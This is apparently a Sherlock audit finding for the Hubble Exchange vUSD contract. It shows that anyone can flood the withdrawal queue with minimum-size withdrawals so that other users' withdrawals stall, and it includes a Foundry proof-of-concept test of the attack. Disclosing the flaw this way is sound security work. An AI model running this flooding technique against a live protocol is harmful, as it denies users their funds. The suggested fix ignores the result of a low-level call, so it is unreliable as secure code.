# Original link
https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/94
0xbepresent

medium

# Malicious actor can flood the `vUSD` withdrawals causing a single user to spend a lot of gas when processing their withdrawal via `MarginAccountHelper.withdrawFromInsuranceFund()` or `MarginAccountHelper.removeMarginInUSD()`

## Summary

Malicious actor can flood the `vUSD` withdrawals list causing the users to spend a lot of gas when processing their withdrawals via [MarginAccountHelper.withdrawFromInsuranceFund()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L71) or [MarginAccountHelper.removeMarginInUSD()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L53) functions. 


## Vulnerability Detail

The [MarginAccountHelper.withdrawFromInsuranceFund()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L71) function helps to withdraw the `vUSD` from insurance fund and get gas token (usdc). The function execute the next calls:
1. It gets the `vUSD` from the insurance contract
2. It burns the `vUSD` tokens in order to get gas token.
3. It calls [vusd.processWithdrawals()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L75C9-L75C35) in order to execute all the queued withdrawals.

The problem is the [vusd.processWithdrawals()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L75C9-L75C35) function proccess all the withdrawals from other users which can be expensive and even his whitdrawal may not been proccessed. Same behaivour is in the [removeMarginInUSD()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L57) funciton.

I created a test where a Malicious actor can flood the withdrawals list with `5e6` amount of each one, causing that the `vusd.processWithdrawals()` to be very expensive to proccess and the withdrawals from alice and bob are not proccessed. Test steps:

1. Attacker mints 500e6 vUSD.
2. Alice and bob mint 5e6 vUSD each one.
3. Attacker floods the withdrawals with 5e6 each one.
4. Alice and bob withdraw at the end.
5. The `processWithdrawals()` is executed but it only executes the attacker withdrawals.

```solidity
// test/foundry/VUSDWithReceive.t.sol
// $ forge test --match-test "testFloodWithdrawals" -vvv
//
    function testFloodWithdrawals() public {
        // A single user might spent a lot of gas in order to withdraw his tokens.
        // An attacker can flood the withdrawals with malicious withdrawals of 5e6 each one.
        // 1. Attacker mints 500e6 vUSD.
        // 2. Alice and bob mint 5e6 vUSD each one.
        // 3. Attacker floods the withdrawals with 5e6 each one.
        // 4. Alice and bob withdraw at the end.
        // 5. The processWithdrawals() is executed but it only executes the attacker withdrawals.
        //
        uint256 amount = 5e6;
        address attacker = address(1337);
        //
        // 1. Attacker mints 500e6 vUSD.
        //
        mintVusd(attacker, 500e6);
        //
        // 2. Alice and bob mint 5e6 vUSD each one.
        //
        mintVusd(alice, amount);
        mintVusd(bob, amount);
        //
        // 3. Attacker floods the withdrawals with 5e6 each one.
        //
        for (int i; i < 100; i++){
            vm.prank(attacker);
            husd.withdraw(5e6);
        }
        //
        // 4. Alice and bob withdraw at the end.
        //
        vm.prank(alice);
        husd.withdraw(amount);
        vm.prank(bob);
        husd.withdraw(amount);
        // assert the withdrawals length and start number.
        assertEq(husd.maxWithdrawalProcesses(), 100);
        assertEq(husd.withdrawalQLength(), 102);
        assertEq(husd.start(), 0);
        //
        // 5. The processWithdrawals() is executed but it only executes the attacker withdrawals.
        //
        husd.processWithdrawals();
        assertEq(husd.start(), 100);
        assertEq(attacker.balance, uint(500e6) * 1e12);
        assertEq(alice.balance, 0);
        assertEq(bob.balance, 0);
    }
```

## Impact

The `withdrawals` list can be flooded by a malicious actor causing the [processWithdrawals()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L65C14-L65C32) function to take a lot of work/gas to process. Additionally the withdrawal for a single user can be queued via [withdrawFromInsuranceFund()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L71) or [removeMarginInUSD()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L53) but his withdrawal may not be proccessed becuase the user may be proccessing the [first 100 withdrawals](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L35) and his withdrawal may be still queued.

Additionally the attack could be cheap since the protocol is deployed on a Avalanche fork.

## Code Snippet

The [withdrawFromInsuranceFund()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/MarginAccountHelper.sol#L71) function:

```solidity
File: MarginAccountHelper.sol
53:     function removeMarginInUSD(uint256 amount) external {
54:         address trader = msg.sender;
55:         marginAccount.removeMarginFor(VUSD_IDX, amount, trader);
56:         vusd.withdrawTo(trader, amount);
57:         vusd.processWithdrawals();
58:     }
...
...
71:     function withdrawFromInsuranceFund(uint256 shares) external {
72:         address user = msg.sender;
73:         uint amount = insuranceFund.withdrawFor(user, shares);
74:         vusd.withdrawTo(user, amount);
75:         vusd.processWithdrawals();
76:     }

```

The [VUSD.processWithdrawals()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L65C14-L65C32) and [VUSD._withdrawTo()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L109) functions:

```solidity
File: VUSD.sol
065:     function processWithdrawals() external override whenNotPaused nonReentrant {
066:         uint reserve = address(this).balance;
067:         require(reserve >= withdrawals[start].amount, 'Cannot process withdrawals at this time: Not enough balance');
068:         uint i = start;
069:         while (i < withdrawals.length && (i - start) < maxWithdrawalProcesses) {
070:             Withdrawal memory withdrawal = withdrawals[i];
071:             if (reserve < withdrawal.amount) {
072:                 break;
073:             }
074: 
075:             (bool success, bytes memory data) = withdrawal.usr.call{value: withdrawal.amount}("");
076:             if (success) {
077:                 reserve -= withdrawal.amount;
078:             } else {
079:                 emit WithdrawalFailed(withdrawal.usr, withdrawal.amount, data);
080:             }
081:             i += 1;
082:         }
083:         // re-entracy not possible, hence can update `start` at the end
084:         start = i;
085:     }
...
...
109:     function _withdrawTo(address to, uint amount) internal {
110:         require(amount >= 5 * (10 ** PRECISION), "min withdraw is 5 vusd");
111:         burn(amount); // burn vusd from msg.sender
112:         withdrawals.push(Withdrawal(to, amount * SCALING_FACTOR));
113:     }
```

## Tool used

Manual review

## Recommendation

The `vUSD` burn and `usdc` withdrawal could be in the same [VUSD._withdrawTo()](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L109) transaction:

```diff
    function _withdrawTo(address to, uint amount) internal {
        require(amount >= 5 * (10 ** PRECISION), "min withdraw is 5 vusd");
        burn(amount); // burn vusd from msg.sender
--      withdrawals.push(Withdrawal(to, amount * SCALING_FACTOR));
++      (bool success, bytes memory data) = to.call{value: amount * SCALING_FACTOR}("");
    }
```

Duplicate of #81 
